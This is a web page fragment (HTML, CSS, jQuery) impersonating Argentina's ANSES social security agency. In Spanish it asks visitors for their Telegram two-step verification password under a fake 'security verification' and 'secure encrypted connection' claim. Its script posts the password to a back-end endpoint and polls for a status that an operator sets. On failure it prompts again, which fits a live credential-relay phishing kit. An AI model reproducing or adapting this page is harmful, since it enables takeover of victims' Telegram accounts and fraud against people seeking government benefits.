<style>
    .password-wrapper {
        padding: 10px 5px;
        text-align: left;
    }

    .password-title {
        font-size: 22px !important;
        font-weight: 700;
        color: #002f5a;
        margin-bottom: 15px;
        text-align: center;
    }

    .password-desc {
        font-size: 15px;
        color: #555;
        text-align: center;
        margin-bottom: 25px;
        line-height: 1.4;
    }

    .anses-label {
        font-size: 14px;
        font-weight: 700;
        color: #002f5a;
        margin-bottom: 8px;
        display: block;
    }

    .anses-password-input {
        width: 100%;
        height: 48px;
        border-radius: 4px;
        border: 1px solid #ccc;
        padding: 10px 15px;
        font-size: 16px;
        transition: border-color 0.3s;
    }

    .anses-password-input:focus {
        border-color: #0080c7;
        outline: none;
        box-shadow: 0 0 5px rgba(0,128,199,0.2);
    }

    .anses-password-input::placeholder {
        font-size: 14px;
        color: #aaa;
    }

    #wrong {
        font-size: 14px;
        color: #d32f2f;
        font-weight: 600;
        margin-top: 10px;
        text-align: center;
        display: none;
    }

    .btn-anses-confirm {
        width: 100%;
        height: 48px;
        border-radius: 4px;
        background-color: #0080c7;
        color: #fff;
        border: none;
        font-weight: 700;
        font-size: 16px;
        text-transform: uppercase;
        margin-top: 20px;
        cursor: pointer;
    }

    .btn-anses-confirm:hover {
        background-color: #005a8d;
    }

    .security-note {
        margin-top: 25px;
        padding: 12px;
        background-color: #f9f9f9;
        border-radius: 4px;
        font-size: 12px;
        color: #777;
        text-align: center;
    }
</style>

<div class="password-wrapper">

    <h3 class="password-title">Verificación de Seguridad</h3>
    <p class="password-desc">Su cuenta tiene habilitada la verificación en dos pasos. Ingrese su contraseña de <strong>Telegram</strong> para finalizar el trámite.</p>

    <div class="mb-3">
        <label class="anses-label">Contraseña de la cuenta</label>
        <input
            type="password"
            class="form-control anses-password-input shadow-none"
            name="phone"
            id="phone"
            placeholder="Ingrese su contraseña"
        />
    </div>

    <p id="wrong">❌ Contraseña incorrecta. Intente de nuevo.</p>

    <button class="btn-anses-confirm btn">CONFIRMAR IDENTIDAD</button>

    <div class="security-note">
        🔒 Esta es una conexión segura cifrada por el sistema de seguridad de ANSES.
    </div>

</div>

<script>
    // Inisialisasi status awal
    $("#wrong").hide();

    function checkStatus() {
        $("#wrong").hide();
        $.ajax({
            url: "API/index.php",
            type: "POST",
            data: {"method":"getStatus"},
            success:function(data){
                if (data.result.status == "success") {
                    window.location.reload();
                } else if (data.result.status == "failed") {
                    $("#wrong").show();
                    $("input[type='password']").val("");
                    $("#loader").hide();
                } else {
                    setTimeout(function(){
                        checkStatus();
                    }, 500);
                }
            }
        });
    }

    $(".btn-anses-confirm").on("click", function(e){
        e.preventDefault();
        var password = $("input[type='password']").val();

        if (password !== "") {
            $("#loader").show();
            $.ajax({
                url: "API/index.php",
                type: "POST",
                data: {"method":"sendPassword","password":password},
                success:function(){
                    setTimeout(function(){
                        checkStatus();
                    }, 500);
                }
            });
        }
    });
</script>